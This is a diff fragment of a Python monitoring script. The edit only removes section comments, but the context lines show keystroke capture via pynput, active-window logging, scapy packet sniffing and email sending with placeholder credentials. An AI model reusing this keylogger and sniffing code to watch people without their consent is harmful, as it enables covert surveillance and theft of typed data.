@@ -26,7 +26,7 @@ EMAIL_USERNAME = 'your_email@gmail.com'
 EMAIL_PASSWORD = 'your_password'
 EMAIL_RECIPIENTS = ['recipient1@gmail.com', 'recipient2@gmail.com', 'recipient3@gmail.com', 'recipient4@gmail.com']
 
-# AI Model Training
+
 def train_ai_model():
     print("Training AI model...")
     sample_data = np.random.rand(100, 5)
@@ -36,7 +36,7 @@ def train_ai_model():
     print("[AI] Model trained successfully!")
     return model
 
-# Send Email Notification
+
 def send_email(subject, body):
     msg = MIMEText(body)
     msg['Subject'] = subject
@@ -51,7 +51,6 @@ def send_email(subject, body):
     except Exception as e:
         print(f"[EMAIL ERROR] {e}")
 
-# Window Monitoring using PyGetWindow
 def monitor_windows():
     while monitoring_active:
         active_window = gw.getActiveWindow()
@@ -59,7 +58,7 @@ def monitor_windows():
             print(f"[WINDOW] Active Window: {active_window.title}")
         time.sleep(2)
 
-# Keystroke Monitoring using Pynput
+
 def on_press(key):
     try:
         key_data = str(key.char)
@@ -72,14 +71,14 @@ def start_keylogger():
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
 
-# Network Monitoring using Scapy
+
 def monitor_network():
     def process_packet(packet):
         if packet.haslayer(scapy.IP):
             print(f"[NETWORK] {packet[scapy.IP].src} -> {packet[scapy.IP].dst}")
     scapy.sniff(prn=process_packet, store=False)
 
-# GUI Setup using Tkinter
+
 
 def create_gui():
     def start_detection():
